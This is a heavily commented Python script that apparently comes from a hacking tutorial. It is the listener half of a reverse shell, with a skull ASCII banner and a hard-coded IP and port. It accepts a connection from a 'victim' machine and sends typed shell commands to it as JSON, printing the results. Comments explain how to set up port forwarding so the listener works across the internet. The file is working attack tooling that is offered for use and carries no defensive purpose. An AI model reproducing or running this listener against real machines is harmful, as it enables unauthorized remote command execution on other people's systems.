#!/usr/local/bin/python3`

# This is a global listener, it is written the same as a local listener, the difference is the 
# importance in setting up port forwarding on your network
# you must have administrator access on your network to be able to set up port forwarding


import socket # Library to allow a socket connection between the host and victim program 
from termcolor import colored # Library to color the text output
import os # Library to allow us to run system commands 
import subprocess # Library to allows us to run processes on a machine and receive the output
import json # Library that allows us to intake more than 1024 bytes

def sendCommand(data, target): # Functions to send commands
	
	json_data = json.dumps(data) # All information 
	target.send(json_data.encode()) # Send and encode the information to the target

def receiveInfo(target): # Function to receive information from victim machine
	
	while True: # While loops that is always true keep the program running and connected
		try: # Try and except to avoid bugs and allows information larget than 1024 bytes
			data = target.recv(1024) # The incoming data is going to be 1024 bytes
			data = data.decode() # We want to decode this information
			return json.loads(data) # Return the information to the shell function
		except ValueError: # If the information is over 1024 bytes
			continue # When the bytes are too big, continue loading the information

def shell(s, target, ip): # Function to create the shell that receives commands
	while True: # While loop keeps the loop going and program connected, allows additional cmd
		
		command = input(str(ip) + '~/% ') # This is our shell, what will show up
		sendCommand(command, target) # Send the cmd and target to the sendcmd function
		if command == 'quit': # If the command is quit
			break # quit the program
		else: # If the command isnt quit, keep the program running
			message = receiveInfo(target) # Receive the output from the command
			print(message) # Print this message to the screen so we can see it

def main(): # Main function	
	print(colored("""

                      ..:::::::::..
                  ..:::aad8888888baa:::..
              .::::d:?88888888888?::8b::::.
            .:::d8888:?88888888??a888888b:::.
          .:::d8888888a8888888aa8888888888b:::.
         ::::dP::::::::88888888888::::::::Yb::::
        ::::dP:::::::::Y888888888P:::::::::Yb::::
       ::::d8:::::::::::Y8888888P:::::::::::8b::::
      .::::88::::::::::::Y88888P::::::::::::88::::.
      :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
      :::::::Y88888888888P::|::Y88888888888P:::::::
      ::::::::::::::::888:::|:::888::::::::::::::::
      `:::::::::::::::8888888888888b::::::::::::::'
       :::::::::::::::88888888888888::::::::::::::
        :::::::::::::d88888888888888:::::::::::::
         ::::::::::::88::88::88:::88::::::::::::
          `::::::::::88::88::88:::88::::::::::'
            `::::::::88::88::P::::88::::::::'
              `::::::88::88:::::::88::::::'
                 ``:::::::::::::::::::''
                      ``:::::::::''

""", 'red'))
	print("""
	     Python Reverse Shell Listener
		""")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # This is how we connect and listen
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Also used for connection

	try: # Try loop to handle errors

		s.bind(("192.168.1.24", 6996)) # YOU MUST SET THIS BEFORE USE
		s.listen(1) # Listen for a certain number of commands

		print(colored("[*] Listening for Incoming Connections", 'green'))

		target, ip = s.accept() # Accept any incoming connections
		print(colored('[+]Connection Established From: %s' % str(ip), 'green')) 
		

		shell(s, target, ip) # Send the connection, target, and target ip to the shell
	

		s.close() # Once the process is over, close the connection
	except Exception: # Except, if the connection doesnt work
		print('[-]Error Occured') # Print some troubleshooting tips to help
		print(colored("""Troubleshooting Tips:
		
		- Check IP address
	  	   - Run ' curl ifconfig.me ' for global IP (Listener)
	 	   - Run ' ifconfig ' OR ' ip addr show ' for local IP (Host)
		- Check connection
		   - Ensure that your device has a strong internet connection
		- Program was stopped
	   	   - OR
		- Code is bugged and needs to be fixed
		""", 'red'))
if __name__ == '__main__': # Statement that answers true and calls the main function
	main()
